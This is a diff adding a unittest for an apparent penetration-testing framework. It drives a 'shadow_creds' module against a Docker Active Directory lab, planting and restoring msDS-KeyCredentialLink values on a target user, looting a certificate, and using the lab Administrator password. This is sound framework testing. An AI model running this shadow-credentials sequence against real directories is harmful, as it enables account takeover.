@@ -3538,6 +3538,73 @@ class TestPkinitLab(unittest.TestCase):
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
 @unittest.skipUnless(impacket_available(), "impacket not installed")
+class TestShadowCredsLab(unittest.TestCase):
+    """shadow_creds against the AD lab: the fixture schema carries
+    msDS-KeyCredentialLink, so the plant + restore are real. The TGT
+    step meets the lab's PKINIT-less KDC and must refuse cleanly."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        up_ad_lab(cls.manager)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("ad")
+
+    def test_plant_refusal_and_restore(self):
+        def kcl_values():
+            from impacket.ldap import ldap as impacket_ldap
+            from impacket.ldap import ldapasn1
+            conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
+            conn.login("Administrator", "P@ssw0rd123", "forge.local")
+            values = []
+            for packet in conn.search(
+                    searchBase="DC=forge,DC=local",
+                    searchFilter="(sAMAccountName=analyst)",
+                    attributes=["msDSKeyCredentialLink"]):
+                if isinstance(packet, ldapasn1.SearchResultEntry):
+                    attrs = {str(a["type"]): [str(v) for v in a["vals"]]
+                             for a in packet["attributes"]}
+                    values = attrs.get("msDSKeyCredentialLink", [])
+            conn.close()
+            return values
+
+        before = kcl_values()
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/shadow_creds",
+                    f"set RHOSTS {HOST}",
+                    "set DOMAIN forge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "set TARGET analyst",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("shadow credential planted", out)
+            self.assertIn("PKINIT as analyst failed", out)
+            self.assertIn(f"KCL restored ({len(before)} value(s))", out)
+            # the cert PEM is looted even when the KDC can't issue
+            loot = console.store.loot("cert")
+            self.assertEqual(len(loot), 1)
+            self.assertIn("BEGIN CERTIFICATE", loot[0]["content"])
+            # restore really happened: the planted device value is gone
+            # and the directory is back to exactly the pre-run set
+            self.assertEqual(kcl_values(), before)
+        finally:
+            console.store.close()
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
 @unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
 class TestCoerceLab(unittest.TestCase):
     """coerce against the windows lab's Server 2022: the classic methods
